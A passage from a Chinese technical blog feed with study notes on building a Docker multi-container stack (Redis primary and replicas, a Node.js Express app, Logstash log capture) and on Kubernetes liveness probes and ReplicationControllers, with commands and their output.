class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir redis_replica &amp;&amp; cd redis_replica</span><br></pre></td></tr></table></figure><p>第二步创建Dockerfile文件。Redis副本镜像也是基于Redis基础镜像构建的。并通过ENTRYPOINT指定了运行Redis服务器的命令，设置了日志文件存储位置和<code>slaveof</code>选项，这样就把Redis配置为主-副本模式，从这个镜像构建的任何容器都会将redis_primary主机的Redis作为主服务，连接其6379端口，成为对应的副本服务器</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> elssm/redis</span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span> [ "redis-server", "--protected-mode no", "--logfile /var/log/redis/redis-replica.log", "--slaveof redis_primary 6379" ]</span><br></pre></td></tr></table></figure><p>第三步构建Redis副本镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/redis_replica .</span><br></pre></td></tr></table></figure><h4 id="创建Redis后端集群"><a href="#创建Redis后端集群" class="headerlink" title="创建Redis后端集群"></a>创建Redis后端集群</h4><p>现在我们已经有了Redis主镜像和副本镜像。如下图所示</p><p><img src="/2021/10/11/Docker构建多容器应用栈/1.png" alt="1"></p><p>接下来我们可以构建自己的Redis环境了。首先我们创建一个用来运行我们的Express应用程序的网络，名为<code>express</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network create express</span><br></pre></td></tr></table></figure><p>使用<code>docker network ls</code>查看网络</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network ls</span><br></pre></td></tr></table></figure><p><img src="/2021/10/11/Docker构建多容器应用栈/2.png" alt="2"></p><p>现在让我们在这个网络中运行Redis主容器，如下代码所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -h redis_primary --net express --name redis_primary elssm/redis_primary</span><br></pre></td></tr></table></figure><p>这里使用<code>docker run</code>命令从<code>elssm/redis_primary</code>镜像创建了一个容器。<code>-h</code>用来设置容器的主机名。这会覆盖默认的行为(默认将容器的主机名设置为容器ID)并允许我们指定自己的主机名，使用这个标志可以确保容器使用<code>redis_primary</code>作为主机名，并被本地的DNS服务正确解析。<code>--net</code>确保该容器在<code>express</code>网络中运行，<code>--name</code>确保容器的名字是<code>redis_primary</code>        </p><p>接下来使用<code>docker logs</code>命令来查看Redis主容器的运行情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs redis_primary</span><br></pre></td></tr></table></figure><p>执行命令后发现什么都没有，这是因为Redis服务会将日志记录到一个文件而不是记录到标准输出，所有使用Docker查不到任何日志。因此我们可以使用之前创建的<code>/var/log/redis</code>卷。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --volumes-from redis_primary ubuntu cat /var/log/redis/redis-server.log</span><br></pre></td></tr></table></figure><p>其中<code>-it</code>是以交互方式运行了另一个容器，<code>--rm</code>会在进程运行完后自动删除容器。<code>--volumes-from</code>告诉它从<code>redis_primary</code>容器挂载了所有的卷，然后我们指定了一个ubuntu基础镜像，并执行cat命令来查看日志，这种方式利用了卷的优点，可以直接从    <code>redis_primary</code>容器挂载<code>/var/log/redis</code>目录并读取里面的日志文件，日志文件内容如下图所示</p><p><img src="/2021/10/11/Docker构建多容器应用栈/3.png" alt="3"></p><p>接下来我们创建一个Redis副本容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -h redis_replica1 --name redis_replica1 --net express elssm/redis_replica</span><br></pre></td></tr></table></figure><p>这里我们运行了另一个容器，这个容器来自<code>elssm/redis_replica</code>镜像，<code>-d</code>标志在后台运行，<code>-h</code>指定主机名，<code>--name</code>指定容器名，<code>--net</code>指定在<code>express</code>网络中运行Redis副本容器。</p><p>和查看Redis主容器一样，我们来查看一下Redis副本容器中的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --volumes-from redis_replica1 ubuntu cat /var/log/redis/redis-replica.log</span><br></pre></td></tr></table></figure><p>日志文件内容如下图所示</p><p><img src="/2021/10/11/Docker构建多容器应用栈/4.png" alt="4"></p><p>到这里我们已经成功启动了redis_primary和redis_replica1容器，并让这两个容器进行主从复制。现在我们再来加入另一个容器副本redis_replica2，从而确保万无一失！</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -h redis_replica2 --name redis_replica2 --net express elssm/redis_replica</span><br></pre></td></tr></table></figure><p>查看副本redis_replica2容器中的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --volumes-from redis_replica2 ubuntu cat /var/log/redis/redis-replica.log</span><br></pre></td></tr></table></figure><p>如下图所示</p><p><img src="/2021/10/11/Docker构建多容器应用栈/5.png" alt="5"></p><h4 id="创建Node容器"><a href="#创建Node容器" class="headerlink" title="创建Node容器"></a>创建Node容器</h4><p>现在我们已经让Redis集群运行了，我们可以为Node.js应用启动一个容器，代码如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name nodeapp -p 3000:3000 --net express elssm/nodejs</span><br></pre></td></tr></table></figure><p>这里我们从<code>elssm/nodejs</code>镜像创建了一个新容器，命名为<code>nodeapp</code>，并将容器内的3000端口映射到宿主机的3000端口，同样我们的<code>nodeapp</code>容器也是运行在express网络中的。</p><p>使用<code>docker logs</code>命令来查看<code>nodeapp</code>容器在做什么</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> docker logs nodeapp</span><br><span class="line">Listening on port 3000</span><br></pre></td></tr></table></figure><p>访问本地3000端口，如下图所示</p><p><img src="/2021/10/11/Docker构建多容器应用栈/6.png" alt="6"></p><p>这个输出表明应用正在工作，浏览器的会话状态(session)回先被记录到Redis主容器redis_primary，然后复制到两个Redis副本容器redis_replica1和redis_replica2</p><h4 id="捕获应用日志"><a href="#捕获应用日志" class="headerlink" title="捕获应用日志"></a>捕获应用日志</h4><p>现在应用已经正常运行了，我们需要把这个应用放到生产环境中，在生产环境里需要确保可以捕获日志并将日志保存到日志服务器。我们将使用Logstash来完成这件事，首先创建一个Logstash镜像。</p><p>第一步还是在本地创建一个名为<code>logstash</code>的文件夹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir logstash &amp;&amp; cd logstash</span><br></pre></td></tr></table></figure><p>第二步创建Dockerfile文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">FROM ubuntu:18.04</span><br><span class="line"></span><br><span class="line">RUN apt-get -qq update</span><br><span class="line">RUN apt-get -qq install wget gnupg2 openjdk-8-jdk</span><br><span class="line">RUN wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | apt-key add -</span><br><span class="line">RUN echo "deb https://artifacts.elastic.co/packages/5.x/apt stable main" | tee -a /etc/apt/sources.list.d/elastic-5.x.list</span><br><span class="line">RUN apt-get -qq update</span><br><span class="line">RUN apt-get -qq install logstash</span><br><span class="line"></span><br><span class="line">WORKDIR /usr/share/logstash</span><br><span class="line"></span><br><span class="line">ADD logstash.conf /usr/share/logstash/</span><br><span class="line"></span><br><span class="line">ENTRYPOINT [ "bin/logstash" ]</span><br><span class="line">CMD [ "-f", "logstash.conf", "--config.reload.automatic" ]</span><br></pre></td></tr></table></figure><p>这个镜像在安装了Logstash之后，将<code>logstash.conf</code>文件使用ADD指令添加到了<code>/usr/share/logstash/</code>目录。<code>logstash.conf</code>文件和Dockerfile在统计目录下，它的内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">input &#123;</span><br><span class="line">  file &#123;</span><br><span class="line">    type =&gt; "syslog"</span><br><span class="line">    path =&gt; ["/var/log/nodeapp/nodeapp.log", "/var/log/redis/redis-server.log"]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">output &#123;</span><br><span class="line">  stdout &#123;</span><br><span class="line">    codec =&gt; rubydebug</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个logstash配置很简单，它监控两个文件<code>/var/log/nodeapp/nodeapp.log</code>和<code>/var/log/redis/redis-server.log</code>。logstash会一直监控这两个文件，将其中新的内容发送个Logstash，配置文件的第二部分是output部分，接受所有logstash输入的内容并将其输出到标准输出上，在实际情况中，一般会将logstash配置为输出到ElasticSearch集群或者是其他的目的地。</p><p>第三步构建logstash镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t elssm/logstash .</span><br></pre></td></tr></table></figure><p>镜像构建成功之后，我们从这个镜像启动一个容器，代码如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name logstash --volumes-from redis_primary --volumes-from nodeapp elssm/logstash</span><br></pre></td></tr></table></figure><p>这样我们就启动了一个名为logstash的新容器，并通过<code>--volumes-from</code>标志分别挂载了redis_primary和nodeapp容器的卷，这样就可以访问Redis和Node的日志文件了，任何加到这些日志文件里的内容都会反应在logstash容器的卷里。</p><p>现在可以使用<code>-f</code>标志来查看logstash容器的日志</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f logstash</span><br></pre></td></tr></table></figure><p>在浏览器里刷新Web应用之后，会产生一个新的日志时间，我们就能在logstash容器的输出中看到这个事件。如下图所示</p><p><img src="/2021/10/11/Docker构建多容器应用栈/7.png" alt="7"></p><p>相应的当我们启动redis_primary容器后，也可以在logstash中看到相应的日志事件</p><p><img src="/2021/10/11/Docker构建多容器应用栈/8.png" alt="8"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;在这个例子中，需要做的是把一个使用&lt;code&gt;Express&lt;/code&gt;框架的并且带有&lt;code&gt;Redis&lt;/code&gt;后端的&lt;code
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Kubernetes in Action Learning Notes</title>
    <link href="elssm.github.io/2021/10/07/Kubernetes-in-Action-Learning-Notes/"/>
    <id>elssm.github.io/2021/10/07/Kubernetes-in-Action-Learning-Notes/</id>
    <published>2021-10-07T02:10:06.000Z</published>
    <updated>2021-10-12T09:32:51.975Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>对于《Kubernetes in action》这本书前三章节相关的笔记，我都记录在下面这个链接了，有需求的可以看看。</p><p><a href="http://elssm.top/2021/03/22/Docker-Kubernetes%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://elssm.top/2021/03/22/Docker-Kubernetes%E5%AD%A6%E4%B9%A0/</a></p><h4 id="存活探针"><a href="#存活探针" class="headerlink" title="存活探针"></a>存活探针</h4><p>Kubernetes可以通过存活探针(liveness probe)检查容器是否还在运行，可以为pod中的每个容器单独指定存活探针。如果探测失败，Kubernetes将定期执行探针并重新启动容器。</p><h5 id="Kubernetes三种探测容器的机制"><a href="#Kubernetes三种探测容器的机制" class="headerlink" title="Kubernetes三种探测容器的机制"></a>Kubernetes三种探测容器的机制</h5><ul><li>HTTP GET探针对容器的IP地址执行HTTP GET请求。如果HTTP响应状态码事<code>2xx</code>或<code>3xx</code>，则认为探测成功，如果服务器返回错误响应状态码或是没有收到响应，则认为探测事失败的，这个时候容器将会被重新启动。</li><li>TCP套接字探针尝试与容器指定端口建立TCP连接，如果连接建立成功，则探测成功，否则，容器重新启动。</li><li>Exec探针在容器内执行任意命令，并检查命令的退出状态码，如果状态码是0，则探测成功。所有其他的状态码都会被认为失败。</li></ul><h5 id="创建基于HTTP的存活探针"><a href="#创建基于HTTP的存活探针" class="headerlink" title="创建基于HTTP的存活探针"></a>创建基于HTTP的存活探针</h5><p>老规矩，先来创建一个名为<code>kubia-liveness-probe.yaml</code>的文件，该pod的描述文件定义了一个<code>httpGet</code>存活探针，该探针告诉Kubernetes定期在端口8080路径上执行HTTP GET请求，以确定该容器是否健康。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">kubia-liveness</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">luksa/kubia-unhealthy</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">kubia</span></span><br><span class="line">    <span class="attr">livenessProbe:</span></span><br><span class="line">      <span class="attr">httpGet:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/</span></span><br><span class="line">        <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>接下来使用<code>kubectl create</code>从YAML文件创建pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-liveness-probe.yaml</span><br></pre></td></tr></table></figure><p>大约过几分钟后，我们通过<code>kubectl get</code>可以看到，pod的容器已经被重启了一次，如果继续等下去，容器将会再次重启，无限循环。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pod kubia-liveness</span><br><span class="line">NAME             READY   STATUS    RESTARTS   AGE</span><br><span class="line">kubia-liveness   1/1     Running   1          5m1s</span><br></pre></td></tr></table></figure><p>通过<code>kubectl describe</code>可以看到重启容器后的相关描述</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl describe pod kubia-liveness</span><br><span class="line">Name:         kubia-liveness</span><br><span class="line">Namespace:    default</span><br><span class="line">Priority:     0</span><br><span class="line">Node:         docker-desktop/192.168.65.4</span><br><span class="line">Start Time:   Thu, 07 Oct 2021 10:42:42 +0800</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Status:       Running</span><br><span class="line">IP:           10.1.0.33</span><br><span class="line">IPs:</span><br><span class="line">  IP:  10.1.0.33</span><br><span class="line">Containers:</span><br><span class="line">  kubia:</span><br><span class="line">    Container ID:   docker://983b1e5ec9db6185dd66335def1b0b4ed3edd2eb1a6c4d4cd934fc697b450f67</span><br><span class="line">    Image:          luksa/kubia-unhealthy</span><br><span class="line">    Image ID:       docker-pullable://luksa/kubia-unhealthy@sha256:5c746a42612be61209417d913030d97555cff0b8225092908c57634ad7c235f7</span><br><span class="line">    Port:           &lt;none&gt;</span><br><span class="line">    Host Port:      &lt;none&gt;</span><br><span class="line">    State:          Running</span><br><span class="line">      Started:      Thu, 07 Oct 2021 10:49:03 +0800</span><br><span class="line">    Last State:     Terminated</span><br><span class="line">      Reason:       Error</span><br><span class="line">      Exit Code:    137</span><br><span class="line">      Started:      Thu, 07 Oct 2021 10:47:14 +0800</span><br><span class="line">      Finished:     Thu, 07 Oct 2021 10:49:02 +0800</span><br><span class="line">    Ready:          True</span><br><span class="line">    Restart Count:  2</span><br><span class="line">    Liveness:       http-get http://:8080/ delay=0s timeout=1s period=10s #success=1 #failure=3</span><br><span class="line">    Environment:    &lt;none&gt;</span><br></pre></td></tr></table></figure><p>从上述返回的结果中我们可以看到容器此时是正在运行着的，但之前由于<code>Terminated</code>而退出，退出代码为137，137表示该进程由外部信号中断，137是两个数字的总和：128+x，其中x是终止进程的信号编号，在这个例子中，x等于9，这是SIGKILL的信号编号，意味着这个进程被强行终止。</p><h4 id="ReplicationController"><a href="#ReplicationController" class="headerlink" title="ReplicationController"></a>ReplicationController</h4><h5 id="ReplicationController介绍"><a href="#ReplicationController介绍" class="headerlink" title="ReplicationController介绍"></a>ReplicationController介绍</h5><p>ReplicationController是一种Kubernetes资源，可确保它的pod始终保持运行状态，如果pod因任何原因消失，则ReplicationController会注意到缺少了pod并创建替代pod。如下图所示，当节点出现故障时，只有ReplicationController管理的pod才能被重新创建。对于podA而言，则会完全丢失，因为没有东西负责重建它。</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/1.png" alt="1"></p><p>ReplicationController会持续监控正在运行的pod列表，并保证相应“类型”的pod的数目与期望相符，如果正在运行的pod太少，它会根据pod模版创建新的副本。如果正在运行的pod太多，它会删除多余的副本。</p><h5 id="ReplicationController协调流程"><a href="#ReplicationController协调流程" class="headerlink" title="ReplicationController协调流程"></a>ReplicationController协调流程</h5><p>ReplicationController的工作是确保pod的数量始终与其标签选择器匹配。 如果不匹配， 则ReplicationController将根据所需， 采取适当的操作来协调pod的数量。如下图是一个ReplicationController的协调流程</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/2.png" alt="2"></p><h5 id="ReplicationController组成"><a href="#ReplicationController组成" class="headerlink" title="ReplicationController组成"></a>ReplicationController组成</h5><ul><li>label selector（标签选择器）：用于确定ReplicationController作用域中有哪些pod</li><li>replica count（副本个数）：指定应运行的pod数量</li><li>pod template（pod模版）：用于创建新的pod</li></ul><h5 id="创建ReplicationController"><a href="#创建ReplicationController" class="headerlink" title="创建ReplicationController"></a>创建ReplicationController</h5><p>首先创建一个名为<code>kubia-rc.yaml</code>的YAML文件，代码描述如下。当上传文件道API服务器时，Kubernetes会创建一个名为kubia的ReplicationController，它确保符合标签选择器<code>app=kubia</code>的pod实例始终是三个，当没有足够的pod时，它根据提供的pod模版创建新的pod。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: ReplicationController</span><br><span class="line">metadata:</span><br><span class="line">  name: kubia</span><br><span class="line">spec:</span><br><span class="line">  replicas: 3</span><br><span class="line">  selector:</span><br><span class="line">    app: kubia</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: kubia</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: kubia</span><br><span class="line">        image: luksa/kubia</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 8080</span><br></pre></td></tr></table></figure><p>使用<code>kubectl create</code>命令创建</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl create -f kubia-rc.yaml</span><br></pre></td></tr></table></figure><p>由于没有任何pod有<code>app=kubia</code>标签，因此ReplicationController会根据pod模版启动三个新的pod。使用<code>kubectl get</code>查看。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods               </span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE</span><br><span class="line">kubia-gjcxj   1/1     Running   0          6s</span><br><span class="line">kubia-pd5r5   1/1     Running   0          6s</span><br><span class="line">kubia-tgjsn   1/1     Running   0          6s</span><br></pre></td></tr></table></figure><p>这个时候如果我们删除了一个pod，看看会发生什么。这个时候被删除的pod状态处于终止状态，而新的pod处于创建状态。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl get pods                  </span><br><span class="line">NAME          READY   STATUS              RESTARTS   AGE</span><br><span class="line">kubia-bcbz5   0/1     ContainerCreating   0          2s</span><br><span class="line">kubia-gjcxj   1/1     Terminating         0          36s</span><br><span class="line">kubia-pd5r5   1/1     Running             0          36s</span><br><span class="line">kubia-tgjsn   1/1     Running             0          36s</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods              </span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE</span><br><span class="line">kubia-bcbz5   1/1     Running   0          2m29s</span><br><span class="line">kubia-pd5r5   1/1     Running   0          3m3s</span><br><span class="line">kubia-tgjsn   1/1     Running   0          3m3s</span><br></pre></td></tr></table></figure><p>通过<code>kubectl get</code>查看ReplicationController的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get rc</span><br><span class="line">NAME    DESIRED   CURRENT   READY   AGE</span><br><span class="line">kubia   3         3         3       3m31s</span><br></pre></td></tr></table></figure><p>通过<code>kubectl describe</code>查看ReplicationController详细信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl describe rc kubia</span><br><span class="line">Name:         kubia</span><br><span class="line">Namespace:    default</span><br><span class="line">Selector:     app=kubia</span><br><span class="line">Labels:       app=kubia</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Replicas:     3 current / 3 desired</span><br><span class="line">Pods Status:  3 Running / 0 Waiting / 0 Succeeded / 0 Failed</span><br><span class="line">Pod Template:</span><br><span class="line">  Labels:  app=kubia</span><br><span class="line">  Containers:</span><br><span class="line">   kubia:</span><br><span class="line">    Image:        luksa/kubia</span><br><span class="line">    Port:         8080/TCP</span><br><span class="line">    Host Port:    0/TCP</span><br><span class="line">    Environment:  &lt;none&gt;</span><br><span class="line">    Mounts:       &lt;none&gt;</span><br><span class="line">  Volumes:        &lt;none&gt;</span><br><span class="line">Events:</span><br><span class="line">  Type    Reason            Age    From                    Message</span><br><span class="line">  ----    ------            ----   ----                    -------</span><br><span class="line">  Normal  SuccessfulCreate  5m1s   replication-controller  Created pod: kubia-tgjsn</span><br><span class="line">  Normal  SuccessfulCreate  5m1s   replication-controller  Created pod: kubia-gjcxj</span><br><span class="line">  Normal  SuccessfulCreate  5m1s   replication-controller  Created pod: kubia-pd5r5</span><br><span class="line">  Normal  SuccessfulCreate  4m27s  replication-controller  Created pod: kubia-bcbz5</span><br></pre></td></tr></table></figure><p>获取当前ReplicationController管理的pod的标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods --show-labels</span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE     LABELS</span><br><span class="line">kubia-bcbz5   1/1     Running   0          7m48s   app=kubia</span><br><span class="line">kubia-pd5r5   1/1     Running   0          8m22s   app=kubia</span><br><span class="line">kubia-tgjsn   1/1     Running   0          8m22s   app=kubia</span><br></pre></td></tr></table></figure><p>给ReplicationController管理的pod加标签，在这里我们给名为<code>kubia-bcbz5</code>的pod添加了一个<code>type=special</code>的标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label pod kubia-bcbz5 type=special</span><br></pre></td></tr></table></figure><p>这个时候我们再次查看pod的标签</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods --show-labels            </span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE   LABELS</span><br><span class="line">kubia-bcbz5   1/1     Running   0          11m   app=kubia,type=special</span><br><span class="line">kubia-pd5r5   1/1     Running   0          11m   app=kubia</span><br><span class="line">kubia-tgjsn   1/1     Running   0          11m   app=kubia</span><br></pre></td></tr></table></figure><p>更改已托管的pod的标签，这里我们还是更改名为<code>kubia-bcbz5</code>的pod的标签，这一步操作会使得该pod不再与ReplicationController的标签选择器相匹配。因此这个时候ReplicationController会重新启动一个新的pod。在这里我们使用了<code>--overwrite</code>参数是为了覆盖标签。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl label pod kubia-bcbz5 app=foo --overwrite</span><br></pre></td></tr></table></figure><p>这个时候我们再次列出所有pod，会发现多了一个pod，最后一个是新创建出来的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pods -L app</span><br><span class="line">NAME          READY   STATUS    RESTARTS   AGE     APP</span><br><span class="line">kubia-bcbz5   1/1     Running   0          14m     foo</span><br><span class="line">kubia-pd5r5   1/1     Running   0          15m     kubia</span><br><span class="line">kubia-tgjsn   1/1     Running   0          15m     kubia</span><br><span class="line">kubia-zxcjw   1/1     Running   0          2m27s   kubia</span><br></pre></td></tr></table></figure><p>下图展示了当我们更改pod的标签时，ReplicationController发生的一些操作。</p><p><img src="/2021/10/07/Kubernetes-in-Action-Learning-Notes/3.png" alt="3"></p><h5 id="ReplicationController扩容"><a href="#ReplicationController扩容" class="headerlink" title="ReplicationController扩容"></a>ReplicationController扩容</h5><h6 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h6><p>通过<code>kubectl scale</code>命令扩容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl scale rc kubia --replicas=10</span><br></pre></td></tr></table></figure><h6 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h6><p>通过编辑定义来扩容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl edit rc 